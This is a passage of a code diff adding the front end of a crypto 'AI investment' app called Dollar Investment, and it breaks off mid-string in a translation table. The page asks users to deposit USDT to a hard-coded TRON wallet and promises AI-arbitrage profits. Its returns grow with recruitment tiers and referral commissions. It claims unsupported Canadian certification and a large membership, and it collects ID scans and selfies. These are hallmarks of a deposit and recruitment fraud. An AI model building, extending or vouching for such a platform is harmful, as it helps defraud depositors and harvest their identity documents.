@@ -831,4 +831,1146 @@
 
     <div id="toast" class="toast">Action completed!</div>
 
-    <!-- TAB
+    <!-- TAB 1: HOME -->
+    <div id="tab-home" class="tab-content active">
+      <div class="ticker-banner">
+        <span>📢</span>
+        <div class="ticker-text" data-i18n="tickerText">🔥 Welcome to Dollar Investment! Over 34,000+ Active Members Worldwide. Fully Registered & Certified in Canada. Min Deposit $25, Min Withdrawal $50.</div>
+      </div>
+
+      <div class="balance-card">
+        <div style="font-size: 12px; color: var(--text-muted); font-weight: 700;" data-i18n="totalAssets">Total Assets (USDT)</div>
+        <div class="balance-amount" id="homeTotalAssetsDisplay">2.00</div>
+        
+        <div class="referral-box">
+          <span style="font-size: 12px; color: var(--text-muted); font-weight: 700;" data-i18n="recByRef">Received by Referral:</span>
+          <span style="font-size: 14px; font-weight: 900; color: var(--accent-green);" id="homeReferralEarnedDisplay">$0.00</span>
+        </div>
+
+        <div class="balance-actions">
+          <button class="btn-sub primary" onclick="openDepositModal()" data-i18n="depositBtn">📥 Deposit</button>
+          <button class="btn-sub" onclick="openSubPage('page-withdraw', 'Withdrawal')" data-i18n="withdrawBtn">📤 Withdraw</button>
+        </div>
+      </div>
+
+      <div class="quick-grid-8">
+        <div class="quick-item" onclick="openDepositModal()">
+          <div class="quick-icon-wrapper">📥</div>
+          <div class="quick-label" data-i18n="topupLabel">Top up</div>
+        </div>
+        <div class="quick-item" onclick="openSubPage('page-withdraw', 'Withdrawal')">
+          <div class="quick-icon-wrapper">💸</div>
+          <div class="quick-label" data-i18n="withdrawLabel">Withdraw</div>
+        </div>
+        <div class="quick-item" onclick="switchTab('tab-team')">
+          <div class="quick-icon-wrapper">👥</div>
+          <div class="quick-label" data-i18n="inviteLabel">Invite</div>
+        </div>
+        <div class="quick-item" onclick="openSubPage('page-cs', 'Live Support Hub')">
+          <div class="quick-icon-wrapper">🎧</div>
+          <div class="quick-label">App Support</div>
+        </div>
+        <div class="quick-item" onclick="switchTab('tab-vip')">
+          <div class="quick-icon-wrapper">📊</div>
+          <div class="quick-label" data-i18n="vipLabel">VIP Level</div>
+        </div>
+        <div class="quick-item" onclick="openSubPage('page-intro', 'Platform Introduction')">
+          <div class="quick-icon-wrapper">🎬</div>
+          <div class="quick-label" data-i18n="introLabel">Intro</div>
+        </div>
+        <div class="quick-item" onclick="openSubPage('page-terms', 'Terms of Use')">
+          <div class="quick-icon-wrapper">📖</div>
+          <div class="quick-label" data-i18n="termsLabel">Terms</div>
+        </div>
+        <div class="quick-item" onclick="handleKycMenuClick()">
+          <div class="quick-icon-wrapper">🆔</div>
+          <div class="quick-label" data-i18n="kycLabel">KYC</div>
+        </div>
+      </div>
+
+      <div class="investment-card">
+        <div style="font-weight: 800; margin-bottom: 14px; font-size: 15px; color: var(--accent-cyan);" data-i18n="activityRecords">📋 Activity & History Records</div>
+        <div id="globalHistoryList">
+          <div style="color:var(--text-muted); font-size:13px; text-align:center; padding:10px;" data-i18n="noHistory">No recent history recorded.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TAB 2: ASSETS -->
+    <div id="tab-assets" class="tab-content">
+      <div class="universal-header" style="padding: 8px 0; background: none; border: none;">
+        <button class="nav-back-btn" onclick="switchTab('tab-home')" data-i18n="backHome">← Back to Home</button>
+      </div>
+
+      <div class="balance-card">
+        <div style="font-size: 12px; color: var(--text-muted); font-weight: 700;" data-i18n="totalAssets">Total Assets (USDT)</div>
+        <div class="balance-amount" id="totalBalanceDisplay">2.00</div>
+        
+        <div class="referral-box">
+          <span style="font-size: 12px; color: var(--text-muted); font-weight: 700;" data-i18n="recByRef">Received by Referral:</span>
+          <span style="font-size: 14px; font-weight: 900; color: var(--accent-green);" id="assetsReferralEarnedDisplay">$0.00</span>
+        </div>
+
+        <div class="balance-actions">
+          <button class="btn-sub primary" onclick="openDepositModal()" data-i18n="depositBtn">📥 Deposit</button>
+          <button class="btn-sub" onclick="openSubPage('page-withdraw', 'Withdrawal')" data-i18n="withdrawBtn">📤 Withdraw</button>
+        </div>
+      </div>
+
+      <div class="investment-card" style="border-color: rgba(0,245,118,0.4); background: linear-gradient(135deg, rgba(0,245,118,0.08), rgba(17,24,35,1));">
+        <div style="font-weight: 900; margin-bottom: 8px; font-size: 16px; color: var(--accent-green);" data-i18n="freeWithdrawTitle">🎁 Free Withdrawal Privilege</div>
+        <div class="spec-row">
+          <span data-i18n="memDays">Membership Days:</span>
+          <span class="spec-value" id="daysJoinedText">0 / 25 Days</span>
+        </div>
+        <div class="spec-row">
+          <span data-i18n="feeStatus">Withdrawal Fee Status:</span>
+          <span class="spec-value green" id="freeWithdrawStatusText">Calculating Fee Rules...</span>
+        </div>
+      </div>
+
+      <div class="investment-card">
+        <div style="font-weight: 800; margin-bottom: 12px; font-size: 15px;" data-i18n="assetBreakdown">💼 Asset Allocation Breakdown</div>
+        <div class="list-item">
+          <span style="color:var(--text-muted); font-weight:700;" data-i18n="flexibleFunds">Flexible Funds</span>
+          <span style="font-weight:900" id="flexibleFundsDisplay">2.00 USDT</span>
+        </div>
+        <div class="list-item">
+          <span style="color:var(--text-muted); font-weight:700;" data-i18n="refRewards">Referral Rewards (10%)</span>
+          <span style="font-weight:900; color:var(--accent-green)" id="assetReferralFundDisplay">0.00 USDT</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- TAB 3: VIP -->
+    <div id="tab-vip" class="tab-content">
+      <div class="universal-header" style="padding: 8px 0; background: none; border: none;">
+        <button class="nav-back-btn" onclick="switchTab('tab-home')" data-i18n="backHome">← Back to Home</button>
+      </div>
+
+      <div style="font-size: 18px; font-weight: 900; margin-bottom: 16px; color: var(--accent-cyan);" data-i18n="aiStrategyHeader">⚡ Dollar Investment AI Strategy</div>
+
+      <!-- Today Profit & Daily Breakdown Header -->
+      <div class="investment-card" style="border-color: var(--accent-cyan); background: linear-gradient(135deg, rgba(0,210,255,0.08), rgba(17,24,35,1));">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+          <span style="font-weight:900; font-size:14px; color:var(--accent-cyan);">📈 Today Profit Summary</span>
+          <span style="font-weight:900; font-size:16px; color:var(--accent-green);" id="todayProfitDisplay">$0.00 USDT</span>
+        </div>
+        <div style="display:grid; grid-template-columns:1fr 1fr 1fr; gap:6px; font-size:11px; margin-top: 8px;">
+          <div style="background:rgba(0,0,0,0.4); padding:6px; border-radius:8px;">₿ BTC: <span id="distBtc" style="color:#fff; font-weight:800;">$0.00</span></div>
+          <div style="background:rgba(0,0,0,0.4); padding:6px; border-radius:8px;">Ξ ETH: <span id="distEth" style="color:#fff; font-weight:800;">$0.00</span></div>
+          <div style="background:rgba(0,0,0,0.4); padding:6px; border-radius:8px;">🪙 SOL: <span id="distSol" style="color:#fff; font-weight:800;">$0.00</span></div>
+          <div style="background:rgba(0,0,0,0.4); padding:6px; border-radius:8px;">⚡ TRON: <span id="distTron" style="color:#fff; font-weight:800;">$0.00</span></div>
+          <div style="background:rgba(0,0,0,0.4); padding:6px; border-radius:8px;">🟡 BNB: <span id="distBnb" style="color:#fff; font-weight:800;">$0.00</span></div>
+          <div style="background:rgba(0,0,0,0.4); padding:6px; border-radius:8px;">🌐 ETF: <span id="distEtf" style="color:#fff; font-weight:800;">$0.00</span></div>
+        </div>
+      </div>
+
+      <div class="investment-card" style="border-color: var(--accent-green);">
+        <div style="font-weight: 900; margin-bottom: 12px; font-size: 16px; color: var(--accent-green);" data-i18n="smartExecutor">🤖 Smart Strategy Executor</div>
+        
+        <div class="input-group">
+          <div class="input-label">
+            <span data-i18n="investAmount">Investment Amount</span>
+            <span>Min: $25</span>
+          </div>
+          <div class="amount-input-wrapper">
+            <input type="number" id="homeInvestInput" class="amount-input" value="2.00">
+          </div>
+        </div>
+
+        <div class="pct-selector-grid">
+          <div class="pct-btn" onclick="selectInvestmentPct(25)">25%</div>
+          <div class="pct-btn" onclick="selectInvestmentPct(50)">50%</div>
+          <div class="pct-btn" onclick="selectInvestmentPct(75)">75%</div>
+          <div class="pct-btn active" onclick="selectInvestmentPct(100)">100%</div>
+        </div>
+
+        <button class="btn-gradient" id="btnCreateOrder" onclick="startAIOrderProcess()" data-i18n="createOrderBtn">Create Order (1~4 mins)</button>
+        <div id="cooldownNotice" style="display:none; text-align:center; color:var(--accent-yellow); font-size:12px; margin-top:12px; font-weight:800;">
+          <span data-i18n="cooldownText">⏳ Next Order available in:</span> <span id="cooldownTimer">24:00:00</span>
+        </div>
+      </div>
+
+      <div id="tradingSimulationBox" class="investment-card" style="display:none; text-align:center;">
+        <div style="font-size:15px; font-weight:900; color:var(--accent-green); margin-bottom:12px;" data-i18n="aiInProgress">⚡ AI Strategy Arbitrage in Progress...</div>
+        <div class="spinning-ring" style="margin-bottom:14px;">
+          <span style="font-size:26px;">🤖📈</span>
+        </div>
+        <div style="font-size:13px; color:var(--text-muted); margin-bottom:6px; font-weight:700;"><span data-i18n="timeRemaining">Time remaining:</span> <span id="timerDisplay" style="color:#fff; font-weight:900;">03:00</span></div>
+        <div style="font-size:12px; color:var(--accent-cyan); font-weight:800;" id="livePairStatus">Analyzing BTC/USDT Market Trends...</div>
+      </div>
+
+      <div style="font-size: 16px; font-weight: 900; margin: 22px 0 12px 0; color: var(--accent-purple);" data-i18n="gridLevelsHeader">🏆 Grid Levels (Auto-Unlocked by Team Size)</div>
+      <div class="vip-card" id="gridCard1"><div class="vip-header"><div class="vip-title" data-i18n="grid1Title">Grid 1 (4 Members)</div><div class="vip-rate">1.50% - 2.00%</div></div></div>
+      <div class="vip-card" id="gridCard2"><div class="vip-header"><div class="vip-title" data-i18n="grid2Title">Grid 2 (6 Members)</div><div class="vip-rate">2.00% - 4.00%</div></div></div>
+      <div class="vip-card" id="gridCard3"><div class="vip-header"><div class="vip-title" data-i18n="grid3Title">Grid 3 (8 Members)</div><div class="vip-rate">4.00% - 6.00%</div></div></div>
+      <div class="vip-card" id="gridCard4"><div class="vip-header"><div class="vip-title" data-i18n="grid4Title">Grid 4 (10 Members)</div><div class="vip-rate">6.00% - 8.00%</div></div></div>
+      <div class="vip-card" id="gridCard5"><div class="vip-header"><div class="vip-title" data-i18n="grid5Title">Grid 5 (12 Members)</div><div class="vip-rate">8.00% - 10.00%</div></div></div>
+      <div class="vip-card" id="gridCard6"><div class="vip-header"><div class="vip-title" data-i18n="grid6Title">Grid 6 (14 Members)</div><div class="vip-rate">10.00% - 12.00%</div></div></div>
+      <div class="vip-card" id="gridCard7"><div class="vip-header"><div class="vip-title" data-i18n="grid7Title">Grid 7 (16 Members)</div><div class="vip-rate">12.00% - 14.00%</div></div></div>
+    </div>
+
+    <!-- TAB 4: TEAM -->
+    <div id="tab-team" class="tab-content">
+      <div class="universal-header" style="padding: 8px 0; background: none; border: none;">
+        <button class="nav-back-btn" onclick="switchTab('tab-home')" data-i18n="backHome">← Back to Home</button>
+      </div>
+
+      <div class="investment-card" style="border-color: rgba(0, 210, 255, 0.4); background: linear-gradient(135deg, rgba(0,210,255,0.1), rgba(157,78,221,0.1));">
+        <div style="font-weight: 900; margin-bottom: 12px; font-size: 16px; color: var(--accent-cyan);" data-i18n="inviteOverview">🤝 Invite Friends Overview (10% Bonus)</div>
+        <div class="spec-row"><span data-i18n="totalTeamMem">Total Team Members:</span> <span class="spec-value green" id="homeTeamSizeText">0 Members</span></div>
+        <div class="spec-row"><span>Total Team Deposit Asset:</span> <span class="spec-value green" id="homeTeamTotalDepositText">$0.00</span></div>
+        <div class="spec-row"><span>Total Team Income & Earnings:</span> <span class="spec-value green" id="homeTeamIncomeText">$0.00</span></div>
+        <div class="address-card" style="margin-top: 12px;">
+          <span id="homeReferralLinkText" style="font-size: 11px;">Generating referral link...</span>
+          <button class="copy-btn" onclick="copyReferralLink()" data-i18n="copyLinkBtn">Copy Link</button>
+        </div>
+      </div>
+
+      <div class="balance-card">
+        <div style="font-size: 16px; font-weight: 900; color: #fff; margin-bottom: 14px;" data-i18n="teamDataOverview">📊 Team Data Overview</div>
+        <div class="team-grid-4">
+          <div class="team-stat-box">
+            <div style="font-size: 11px; color: var(--text-muted); font-weight: 700;">Team Size</div>
+            <div class="team-stat-val" id="teamOverviewSize">0</div>
+          </div>
+          <div class="team-stat-box">
+            <div style="font-size: 11px; color: var(--text-muted); font-weight: 700;">Team Asset / Deposit</div>
+            <div class="team-stat-val" id="teamOverviewAsset">$0.00</div>
+          </div>
+          <div class="team-stat-box">
+            <div style="font-size: 11px; color: var(--text-muted); font-weight: 700;">New Joiners</div>
+            <div class="team-stat-val" id="teamOverviewJoiners">0</div>
+          </div>
+          <div class="team-stat-box">
+            <div style="font-size: 11px; color: var(--text-muted); font-weight: 700;">Team Earnings</div>
+            <div class="team-stat-val" id="teamOverviewTodayInc">$0.00</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="investment-card">
+        <div style="font-weight: 900; margin-bottom: 12px; font-size: 15px; color: var(--accent-green);" data-i18n="teamMembersHistory">👥 Team Members & Deposit History</div>
+        <div id="teamMemberList">
+          <div style="color:var(--text-muted); font-size:13px; text-align:center; padding:12px;" data-i18n="noTeamMembers">No team members registered under your link yet. Share your link to earn 10% deposit commissions!</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TAB 5: ME -->
+    <div id="tab-me" class="tab-content">
+      <div class="universal-header" style="padding: 8px 0; background: none; border: none;">
+        <button class="nav-back-btn" onclick="switchTab('tab-home')" data-i18n="backHome">← Back to Home</button>
+      </div>
+
+      <div class="investment-card" style="background: linear-gradient(135deg, rgba(157,78,221,0.2), rgba(0,245,118,0.15)); border: 2px solid rgba(157,78,221,0.4);">
+        <div style="display:flex; justify-content:space-between; align-items:center;">
+          <div>
+            <div style="font-weight:900; font-size:18px;" id="meUsernameDisplay">Dollar-User</div>
+            <div style="font-size:13px; color: var(--accent-cyan); font-weight:800; margin-top:3px;" id="meUserIdDisplay">ID: Loading...</div>
+          </div>
+          <span class="badge-status badge-pending" id="meKycStatusBadge">KYC: Pending</span>
+        </div>
+      </div>
+
+      <div class="investment-card">
+        <div style="font-weight: 900; margin-bottom: 14px; font-size: 16px; color: var(--accent-yellow);" data-i18n="personalAccDetails">👤 Personal Account Details</div>
+        <div class="list-item" onclick="handleKycMenuClick()">
+          <span style="font-weight: 700;" data-i18n="kycLinkMenu">🆔 Identity Verification (KYC)</span>
+          <span style="color:var(--accent-green); font-weight:900;" id="meKycActionText">Verify Now →</span>
+        </div>
+        <div class="list-item" onclick="openSubPage('page-cs', 'Live Support Hub')">
+          <span style="font-weight: 700;" data-i18n="csLinkMenu">🎧 App Support (Live Chat)</span>
+          <span style="color:var(--accent-cyan); font-weight:900;" data-i18n="supportHub">Chat Now →</span>
+        </div>
+        <div class="list-item" onclick="openSubPage('page-terms', 'Terms of Use')">
+          <span style="font-weight: 700;" data-i18n="termsLinkMenu">📖 Terms of Use</span>
+          <span style="color:var(--text-muted); font-weight:800;" data-i18n="readMore">Read →</span>
+        </div>
+      </div>
+
+      <div class="investment-card">
+        <button class="btn-sub primary" style="width:100%; padding:14px; margin-bottom:12px; font-weight:900;" onclick="handleLogout()" data-i18n="signOutBtn">Sign Out</button>
+        <button class="danger-btn" onclick="handleDeleteAccount()" data-i18n="deleteAccBtn">Delete Account</button>
+      </div>
+    </div>
+
+    <!-- SUB-PAGE: WITHDRAWAL SCREEN -->
+    <div id="page-withdraw" class="tab-content">
+      <div style="font-size: 13px; color: var(--text-muted); margin-bottom: 6px; font-weight: 700;" data-i18n="selectCurrency">Select Currency</div>
+      <div class="input-group">
+        <select id="withdrawCurrency" class="amount-input">
+          <option value="USDT" selected>₮ USDT</option>
+        </select>
+      </div>
+
+      <div style="font-size: 13px; color: var(--text-muted); margin-bottom: 6px; font-weight: 700;" data-i18n="selectNetwork">Select Network</div>
+      <div class="input-group">
+        <select id="withdrawNetwork" class="amount-input">
+          <option value="TRC20" selected>Tron (TRC20)</option>
+          <option value="ERC20">Ethereum (ERC20)</option>
+          <option value="BEP20">BNB Smart Chain (BEP20)</option>
+        </select>
+      </div>
+
+      <div class="input-group">
+        <div class="input-label">
+          <span data-i18n="withdrawAmountLabel">Withdrawal Amount</span>
+          <span>Min: $50 USDT</span>
+        </div>
+        <input type="number" id="withdrawAmountInput" class="amount-input" placeholder="Min 50 USDT">
+      </div>
+
+      <div class="input-group">
+        <div class="input-label" data-i18n="walletAddressLabel">Wallet Address</div>
+        <input type="text" id="withdrawAddressInput" class="amount-input" placeholder="Paste your USDT wallet address">
+      </div>
+
+      <div class="investment-card" style="background: rgba(0,0,0,0.4); padding: 14px; margin-bottom: 18px;">
+        <div class="spec-row"><span data-i18n="standardFee">Standard Fee:</span><span class="spec-value" id="withdrawalFeeNotice">Calculating Fee...</span></div>
+        <div class="spec-row"><span data-i18n="estProcessing">Estimated Processing Time:</span><span class="spec-value green" data-i18n="processingTimeText">10 minutes to 3 business days</span></div>
+      </div>
+
+      <button class="btn-gradient" onclick="handleWithdrawSubmit()" data-i18n="submitWithdrawBtn">Submit Withdrawal</button>
+    </div>
+
+    <!-- SUB-PAGE: PLATFORM INTRO -->
+    <div id="page-intro" class="tab-content">
+      <div class="investment-card" style="line-height:1.7; font-size:13px; color:#e2e8f0;">
+        <div style="font-weight:900; font-size:18px; color: var(--accent-cyan); margin-bottom:14px;" data-i18n="certifiedCanadaHeader">Certified by Canada Dollar Investment AI Plan</div>
+        <p style="margin-bottom:12px;"><strong data-i18n="introP1Bold">Dollar Investment</strong> <span data-i18n="introP1Text">is an internationally recognized, Canada-certified financial technology enterprise (Registration #882941-Canada). Operating at the forefront of automated digital asset management, we leverage advanced AI-driven algorithmic arbitrage to connect over 34,000+ active global investors with stable, high-yield digital returns.</span></p>
+        <p style="margin-bottom:12px;" data-i18n="introP2">Our robust infrastructure operates 24/7 across major global cryptocurrency and commodity markets (including BTC, ETH, and Crude Oil OTC pairs), ensuring maximum liquidity, transparent daily profit distribution, and rigorous security standards.</p>
+        <p style="margin-bottom:12px;" data-i18n="introP3">With certified regulatory compliance, dedicated customer support, and instant peer-to-peer referral bonuses, Dollar Investment provides a trusted gateway into the future of intelligent decentralized finance.</p>
+      </div>
+    </div>
+
+    <!-- SUB-PAGE: KYC VERIFICATION -->
+    <div id="page-kyc" class="tab-content">
+      <div class="investment-card">
+        <div style="font-weight:900; font-size:18px; margin-bottom:6px; color: var(--accent-green);" data-i18n="kycTitle">Identity Verification (KYC)</div>
+        <div style="font-size:13px; color:var(--text-muted); margin-bottom:18px; line-height:1.4;" data-i18n="kycDesc">Please upload original ID Front, ID Back, and Live Selfie. Only authentic images/documents are permitted.</div>
+
+        <input type="file" id="inputKycFront" accept="image/*" style="display:none;" onchange="handleKycCapture('Front', event)">
+        <input type="file" id="inputKycBack" accept="image/*" style="display:none;" onchange="handleKycCapture('Back', event)">
+        <input type="file" id="inputKycSelfie" accept="image/*" style="display:none;" onchange="handleKycCapture('Selfie', event)">
+
+        <div class="kyc-upload-box" onclick="document.getElementById('inputKycFront').click()">
+          <div style="font-size:28px;">🪪</div>
+          <div style="font-size:14px; font-weight:800; margin-top:6px; color:#fff;" id="kycFrontStatus">📷 Upload Original ID Front</div>
+        </div>
+
+        <div class="kyc-upload-box" onclick="document.getElementById('inputKycBack').click()">
+          <div style="font-size:28px;">💳</div>
+          <div style="font-size:14px; font-weight:800; margin-top:6px; color:#fff;" id="kycBackStatus">📷 Upload Original ID Back</div>
+        </div>
+
+        <div class="kyc-upload-box" onclick="document.getElementById('inputKycSelfie').click()">
+          <div style="font-size:28px;">🤳</div>
+          <div style="font-size:14px; font-weight:800; margin-top:6px; color:#fff;" id="kycSelfieStatus">📸 Upload Live Selfie</div>
+        </div>
+
+        <button class="btn-gradient" style="margin-top:14px;" onclick="submitKycVerification()" data-i18n="submitKycBtn">Submit Verification</button>
+      </div>
+    </div>
+
+    <!-- SUB-PAGE: CUSTOMER SERVICE & LIVE CHAT -->
+    <div id="page-cs" class="tab-content">
+      <div class="investment-card">
+        <div style="font-weight:900; font-size:18px; color: var(--accent-cyan); margin-bottom:8px;">🎧 App Support Live Chat</div>
+        <div style="font-size:12px; color:var(--text-muted); margin-bottom:14px;">Chat directly with Master Admin Support in real-time. Send photos, documents or PDFs.</div>
+
+        <div class="chat-box" id="userChatBox">
+          <div style="text-align:center; color:var(--text-muted); font-size:12px;">Loading chat history...</div>
+        </div>
+
+        <input type="file" id="userChatFileInput" accept="image/*,.pdf,.doc,.docx,.txt" style="display:none;" onchange="handleUserFileUpload(event)">
+
+        <div style="display:flex; gap:6px;">
+          <button style="background: rgba(255,255,255,0.1); border: 1px solid var(--accent-cyan); color: #fff; padding: 0 12px; border-radius: 12px; font-size: 18px; cursor: pointer;" onclick="document.getElementById('userChatFileInput').click()">📎</button>
+          <input type="text" id="userChatInput" class="amount-input" placeholder="Type message..." style="padding:10px 14px; font-size:13px;">
+          <button class="btn-gradient" style="width:80px; padding:10px; font-size:13px;" onclick="sendUserChatMessage()">Send</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- SUB-PAGE: TERMS OF USE -->
+    <div id="page-terms" class="tab-content">
+      <div class="investment-card" style="line-height:1.7; font-size:13px; color:#e2e8f0;">
+        <div style="font-weight:900; font-size:18px; color: var(--accent-yellow); margin-bottom:14px;" data-i18n="termsHeader">Terms of Use & Regulatory Agreement</div>
+        <p style="margin-bottom:12px;" data-i18n="term1">1. Enterprise Background: Dollar Investment is a fully registered and certified financial institution in Canada (Reg #882941-Canada), proudly serving over 34,000+ active global members with robust automated trading strategies.</p>
+        <p style="margin-bottom:12px;" data-i18n="term2">2. Bonus & Deposits: Every new verified user receives an automatic $2 USDT registration bonus. Minimum deposit requirement is $25 USDT with secure network processing.</p>
+        <p style="margin-bottom:12px;" data-i18n="term3">3. Withdrawal Policy: Minimum withdrawal is $50 USDT. Standard transactions carry a 9% processing fee. Members enjoy 100% Free Withdrawals (0% fee) after maintaining active status for 25 days.</p>
+        <p style="margin-bottom:12px;" data-i18n="term4">4. AI Strategy & Cooldown: Automated arbitrage orders execute across major crypto and commodity pairs (BTC, ETH, OIL). Each order requires a strict 24-hour interval before reactivation.</p>
+        <p style="margin-bottom:12px;" data-i18n="term5">5. Identity & Compliance: Mandatory KYC identity verification (Front ID, Back ID, and Live Selfie) ensures platform security and regulatory compliance.</p>
+      </div>
+    </div>
+
+    <!-- DEPOSIT MODAL SHEET -->
+    <div id="depositModal" class="modal-overlay">
+      <div class="modal-sheet">
+        <div class="modal-header">
+          <div style="font-weight: 900; font-size: 18px; color: #fff;" data-i18n="depositModalTitle">Deposit USDT</div>
+          <button class="close-btn" onclick="closeDepositModal()">✕</button>
+        </div>
+
+        <div style="margin-bottom: 16px;">
+          <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 6px; font-weight: 700;" data-i18n="selectNetwork">Deposit Network</div>
+          <select id="depositNetworkSelect" class="amount-input" onchange="changeDepositNetwork(this.value)">
+            <option value="TRC20" selected>Tron (TRC20)</option>
+            <option value="ERC20">Ethereum (ERC20)</option>
+            <option value="BEP20">BNB Smart Chain (BEP20)</option>
+          </select>
+        </div>
+
+        <div class="pionex-box" style="background:var(--bg-card); border:1px solid var(--bg-card-border); padding:16px; border-radius:16px;">
+          <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 4px; text-align: left; font-weight: 700;" data-i18n="officialWalletAddr">Official Wallet Address</div>
+          <div class="address-card">
+            <span id="depositWalletAddress">TBDXFTpapFkghPnURKFCVUkMbricHUKPrr</span>
+            <button class="copy-btn" onclick="copyDepositAddress()" data-i18n="copyBtn">Copy</button>
+          </div>
+
+          <div style="display: flex; justify-content: space-between; font-size: 12px; color: var(--text-muted); margin-top: 10px; font-weight: 700;">
+            <span data-i18n="minDepositLabel">Minimum Deposit:</span>
+            <span style="color: var(--accent-green); font-weight: 900;">$25 USDT</span>
+          </div>
+        </div>
+
+        <div style="margin-top: 16px; margin-bottom: 22px;">
+          <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 6px; font-weight: 700;" data-i18n="enterDepositAmt">Enter Deposit Amount ($)</div>
+          <input type="number" id="depositAmountInput" class="amount-input" placeholder="Min $25 USDT" value="25">
+          <div style="font-size:11px; color:var(--accent-yellow); font-weight:700; margin-top:4px;">* Note: Standard 9% Fee will be deducted on deposit credit.</div>
+        </div>
+
+        <button class="btn-gradient" onclick="submitDepositPayment()" data-i18n="confirmDepositBtn">Confirm & Deposit</button>
+      </div>
+    </div>
+
+    <!-- BOTTOM NAVIGATION -->
+    <nav class="bottom-nav">
+      <div class="nav-item active" id="nav-home" onclick="switchTab('tab-home')">
+        <span class="nav-icon">🏠</span>
+        <span data-i18n="navHome">Home</span>
+      </div>
+      <div class="nav-item" id="nav-assets" onclick="switchTab('tab-assets')">
+        <span class="nav-icon">💼</span>
+        <span data-i18n="navAssets">Assets</span>
+      </div>
+      <div class="nav-item" id="nav-vip" onclick="switchTab('tab-vip')">
+        <span class="nav-icon">⚡</span>
+        <span data-i18n="navVip">VIP</span>
+      </div>
+      <div class="nav-item" id="nav-team" onclick="switchTab('tab-team')">
+        <span class="nav-icon">👥</span>
+        <span data-i18n="navTeam">Team</span>
+      </div>
+      <div class="nav-item" id="nav-me" onclick="switchTab('tab-me')">
+        <span class="nav-icon">👤</span>
+        <span data-i18n="navMe">Me</span>
+      </div>
+    </nav>
+
+  </div>
+
+  <!-- FIREBASE ENGINE INTEGRATION -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCK3W-6_eY-CLaUlI1c0T-3kbLabMOIzIw",
+      authDomain: "dollar-investment-56274.firebaseapp.com",
+      projectId: "dollar-investment-56274",
+      storageBucket: "dollar-investment-56274.firebasestorage.app",
+      messagingSenderId: "22201933910",
+      appId: "1:22201933910:web:d7f26555fc9d6bc0465bf7",
+      measurementId: "G-T08WM25ZCM"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    const translations = {
+      EN: { brandTitle: "Dollar Investment", signupTitle: "Create Account", signupSubtitle: "Join Dollar Investment AI Strategy (Canada Regulated)", emailPhoneLabel: "Email or Phone", passwordLabel: "Password", confirmPasswordLabel: "Confirm Password", referralCodeLabel: "Referral Link / Code", signupBtn: "Sign Up ($2 Bonus)", alreadyAcc: "Already have an account?", loginLink: "Log In", loginTitle: "Welcome Back", loginSubtitle: "Log in to your account securely", userLoginLabel: "User (Email or Phone)", savePassLabel: "Save Password & User ID", loginBtn: "Log In", noAcc: "Don't have an account?", signupLink: "Sign Up", backBtn: "← Back", tickerText: "🔥 Welcome to Dollar Investment! Over 34,000+ Active Members Worldwide. Fully Registered & Certified in Canada. Min Deposit $25, Min Withdrawal $50.", totalAssets: "Total Assets (USDT)", recByRef: "Received by Referral:", depositBtn: "📥 Deposit", withdrawBtn: "📤 Withdraw", topupLabel: "Top up", withdrawLabel: "Withdraw", inviteLabel: "Invite", tasksLabel: "Tasks", vipLabel: "VIP Level", introLabel: "Intro", termsLabel: "Terms", kycLabel: "KYC", activityRecords: "📋 Activity & History Records", noHistory: "No recent history recorded.", backHome: "← Back to Home", freeWithdrawTitle: "🎁 Free Withdrawal Privilege", memDays: "Membership Days:", feeStatus: "Withdrawal Fee Status:", feeStandard: "Standard 9% Fee (Free after 25 days)", assetBreakdown: "💼 Asset Allocation Breakdown", flexibleFunds: "Flexible Funds", refRewards: "Referral Rewards (10%)", aiStrategyHeader: "⚡ Dollar Investment AI Strategy", smartExecutor: "🤖 Smart Strategy Executor", investAmount: "Investment Amount", createOrderBtn: "Create Order (1~4 mins)", cooldownText: "⏳ Next Order available in:", aiInProgress: "⚡ AI Strategy Arbitrage in Progress...", timeRemaining: "Time remaining:", gridLevelsHeader: "🏆 Grid Levels (Auto-Unlocked by Team Size)", grid1Title: "Grid 1 (4 Members)", grid2Title: "Grid 2 (6 Members)", grid3Title: "Grid 3 (8 Members)", grid4Title: "Grid 4 (10 Members)", grid5Title: "Grid 5 (12 Members)", grid6Title: "Grid 6 (14 Members)", grid7Title: "Grid 7 (16 Members)", inviteOverview: "🤝 Invite Friends Overview (10% Bonus)", totalTeamMem: "Total Team Members:", totalTeamBal: "Total Team Balance:", todayJoiners: "Today New Joiners:", copyLinkBtn: "Copy Link", teamDataOverview: "📊 Team Data Overview", teamSizeLabel: "Team Size", totalIncomeLabel: "Total Income (10%)", teamMembersHistory: "👥 Team Members & Deposit History", noTeamMembers: "No team members registered under your link yet. Share your link to earn 10% deposit commissions!", personalAccDetails: "👤 Personal Account Details", kycLinkMenu: "🆔 Identity Verification (KYC)", verifyNow: "Verify Now →", csLinkMenu: "🎧 Customer Service", supportHub: "Support Hub →", termsLinkMenu: "📖 Terms of Use", readMore: "Read →", signOutBtn: "Sign Out", deleteAccBtn: "Delete Account", selectCurrency: "Select Currency", selectNetwork: "Select Network", withdrawAmountLabel: "Withdrawal Amount", walletAddressLabel: "Wallet Address", standardFee: "Standard Fee:", feeDeduction: "9% Deduction", estProcessing: "Estimated Processing Time:", processingTimeText: "10 minutes to 3 business days", submitWithdrawBtn: "Submit Withdrawal", certifiedCanadaHeader: "Certified by Canada Dollar Investment AI Plan", introP1Bold: "Dollar Investment", introP1Text: "is an internationally recognized, Canada-certified financial technology enterprise (Registration #882941-Canada). Operating at the forefront of automated digital asset management, we leverage advanced AI-driven algorithmic arbitrage to connect over 34,000+ active global investors with stable, high-yield digital returns.", introP2: "Our robust infrastructure operates 24/7 across major global cryptocurrency and commodity markets (including BTC, ETH, and Crude Oil OTC pairs), ensuring maximum liquidity, transparent daily profit distribution, and rigorous security standards.", introP3: "With certified regulatory 